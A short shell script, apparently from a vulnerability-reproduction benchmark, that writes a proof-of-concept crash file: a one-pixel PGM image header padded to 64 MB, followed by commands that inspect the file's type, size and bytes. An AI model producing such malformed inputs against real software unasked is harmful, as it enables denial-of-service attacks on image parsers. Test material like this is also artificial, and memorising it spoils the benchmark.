set -eu
output=/CybinGym_workdir/poc_crash
rm -f "$output"
printf 'P5\n1 1\n255\n' > "$output"
truncate -s 64M "$output"
chmod 0644 "$output"
printf '%s\n' '=== candidate ==='
file "$output"
stat -c 'path=%n size=%s blocks=%b mode=%a type=%F' "$output"
du -h "$output"
xxd -g1 -l 32 "$output"
tail -c 16 "$output" | xxd -g1
